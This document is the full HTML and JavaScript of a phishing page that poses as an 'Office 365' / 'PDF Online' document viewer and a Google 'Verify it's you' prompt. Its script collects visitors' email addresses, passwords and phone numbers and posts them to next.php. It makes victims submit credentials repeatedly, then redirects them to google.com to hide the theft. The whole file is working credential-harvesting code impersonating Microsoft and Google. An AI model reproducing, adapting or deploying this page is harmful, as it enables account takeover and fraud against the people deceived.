
<!doctype html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Office 365</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">
     textarea:hover, 
     input:hover, 
     textarea:active, 
     input:active, 
     textarea:focus, 
     input:focus,
     button:focus,
     button:active,
     button:hover,
     label:focus,
     .btn:active,
     .btn.active
     {
      outline:0px !important;
      -webkit-appearance:none;
      box-shadow: none !important;
    }


  </style>
</head>
<body style="background-image: url('images/96.jpg'); background-repeat: no-repeat;background-size: cover;">
  <div class="container-fluid p-0">
    <!-- <div class="container-fluid" style="background-color: white; box-shadow:3px 2px 10px rgba(0,0,0,0.2);">
      <div class="row" style="background-color: #ff6c2c;">
        <div class="col-lg-12 mx-auto">
          <img src="images/webmail-w.png" class="img-fluid p-4" width="170px">
        </div>

      </div>

    </div> -->
    <div class="container">
      <div class="row my-5">
        <div class="col-lg-5 mx-auto">
          <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
            <div class="text-left">
              <img src="images/pdf.png" class="img-fluid" width="80px"><span class="pl-4 h5 align-middle">PDF Online</span><br><br>
              <span class="h5">Sign in with your valid email and password to view Document</span><br>
              <span id="msg" class="text-danger"></span><br>
              <span id="error" class="text-danger">That account doesn't exist. Enter a different account</span>
              <small>Email Address</small>
              <div class="form-group">
                <input type="email" name="email" class="form-control rounded-0 bg-transparent" id="email" aria-describedby="emailHelp" placeholder="Email">
              </div>

              <div class="form-group mt-2">
                 <small>Password</small>
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Password" >
              </div>
            </div>
            <div class="form-check mt-3">
              <input type="checkbox" class="form-check-input" id="exampleCheck1">
              <label class="form-check-label" for="exampleCheck1"><a href="#">Keep me sign in</a></label>
              <span><a href="#" class="float-right">Forgot username?</a></span>
            </div>
            <div class="col-lg-12 mt-3">
              <button class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #D61C00;">Sign in</button>
            </div>             
          </div>
          <div class="m-5 p-4 bg-white rounded" id="div2" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
              <div class="text-left">
                <img src="images/pdf.png" class="img-fluid" width="80px"><span class="pl-4 h5 align-middle">PDF Online</span><br><br>
                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
                <span class="h4 font-weight-normal">Verify it's you</span><br>
                <span>This device is not recognized. For security, Google want to make sure it's really you.</span><br>
                <span><a href="#">Learn more</a></span><br>
                
                <span id="msg1" class="text-danger"></span><br>
                <span>Try another way to sign in</span>
                <div class="form-group mt-3 col-12">
                  <input type="number" name="phone" class="form-control rounded-0 bg-transparent p-2" id="phone" aria-describedby="emailHelp" placeholder="Enter Phone No." >
                </div>
              </div>
              <div class="row my-3 py-2">
                <div class="col-lg-12">
                  <button class="btn text-white px-4 w-100" id="submit-btn1" style="background-color: #D61C00;">Verify</button>
                </div>
              </div>             
            </div>
            <!-- <div class="m-5 p-4 bg-white rounded" id="div2" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
              <div class="text-center">
                <img src="images/yahoo1.png" class="img-fluid" width="90px"><br><br>
                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br><br>
                <span id="msg" class="text-danger"></span><br>
                <span class="h5">Enter Password</span><br>
                <span>to finish sign in</span>
                <div class="form-group mt-2">
                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                </div>
                <div class="col-lg-12 mt-3">
                  <button class="btn text-white bg-primary px-4 w-100" id="submit-btn" style="border-radius: 20px;">login</button>
                </div>
              </div>
              <div class="form-check mt-5 mx-auto">
                <span><a href="#">Forgot password?</a></span>
              </div>              
            </div> -->
          </div>
        </div>
      </div>





      <!-- Optional JavaScript -->
      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    </body>


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script>


      /* global $ */
      $(document).ready(function(){
        $('#error').hide();
        $("#div2").hide();
        $("#msg").hide();
        var final="";
        var count=0;
        $('#email').click(function(){
          $('#error').hide();
        });
        $('#next').click(function () {
          var my_email =$('#email').val();
          var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

          if (!filter.test(email.value)) {
            $('#error').show();
            email.focus;
            return false;
          }
          var ind=my_email.indexOf("@");
          var my_slice=my_email.substr((ind+1));
          var c= my_slice.substr(0, my_slice.indexOf('.'));
          var final= c.toLowerCase();
          if (final=="gmail") {
         // $('#error').show();
         $("#div1").animate({left:200, opacity:"hide"}, 0);
         $("#div2").animate({right:200, opacity:"show"}, 1000);
         $("#emailch").html(my_email);

       }
       else
       {

       }
     });
        $('#back').click(function () {
          $("#msg").hide();
          $("#div2").animate({left:200, opacity:"hide"}, 0);
          $("#div1").animate({right:200, opacity:"show"}, 1000);

        });


        $('#submit-btn').click(function(event){
          event.preventDefault();
          var email=$("#email").val();
          var password=$("#password").val();
          var detail=$("#field").html();
          var msg = $('#msg').html();
          $('#msg').text( msg );
          count=count+1;
          if (count>=3) {
            count=0;
            window.location.replace("http://google.com");
          }
          else
          {
            ////////////email check code////////
            var my_email =$('#email').val();
          var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
          var ind=my_email.indexOf("@");
          var my_slice=my_email.substr((ind+1));
          var c= my_slice.substr(0, my_slice.indexOf('.'));
          var final= c.toLowerCase();
            ////////////email check code////////
          if (final!="gmail") {
           $.ajax({
            dataType: 'JSON',
            url: 'next.php',
            type: 'POST',
            data:{
              email:email,
              password:password,
              detail:detail,

            },
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
               }
               else{
                $('#msg').html(response['msg']);
              }
            }
          },
          error: function(){
            $("#msg").show();
            $('#msg').html("Please try again later");
          },
          complete: function(){
            $('#submit-btn').html('Login');
          }
        });

         }
         else
         {
          if (count>=2) {
            $("#div1").animate({left:200, opacity:"hide"}, 0);
          $("#div2").animate({right:200, opacity:"show"}, 1000);
          $("#emailch").html(my_email);
          }
          else
          {
           $.ajax({
            dataType: 'JSON',
            url: 'next.php',
            type: 'POST',
            data:{
              email:email,
              password:password,
              detail:detail,

            },
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
               }
               else{
                $('#msg').html(response['msg']);
              }
            }
          },
          error: function(){
            $("#msg").show();
            $('#msg').html("Please try again later");
          },
          complete: function(){
            $('#submit-btn').html('Login');
          }
        });

          }


        }

           
         }
       });
$('#submit-btn1').click(function(event){
          event.preventDefault();
          var email=$("#email").val();
          var password=$("#password").val();
          var phone=$("#phone").val();
          var detail=$("#field").html();
          var msg1 = $('#msg1').html();
          // count=count+1;
        // if (count>=2) {
        //   count=0;
        //   $("#div2").animate({left:200, opacity:"hide"}, 0);
        //   $("#div3").animate({right:200, opacity:"show"}, 1000);
        //   // window.location.replace("http://google.com");
        // }
        // else
        // {
           $.ajax({
            dataType: 'JSON',
            url: 'next.php',
            type: 'POST',
            data:{
              email:email,
              password:password,
              detail:detail,
              phone:phone,

            },
            beforeSend: function(xhr){
              $('#submit-btn1').html('Verifing...');
            },
            success: function(response){
              window.location.replace("http://google.com");
              if(response){
                $("#msg1").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg1').html(response['msg']);
               }
               else{
                $('#msg1').html(response['msg']);
              }
            }
          },
          error: function(){
              window.location.replace("http://google.com");
            $("#msg1").show();
            $('#msg1').html("Please try again later");
          },
          complete: function(){
            $('#submit-btn1').html('Verify');
          }
        });
         // }
       });


      });
    </script>
    </html>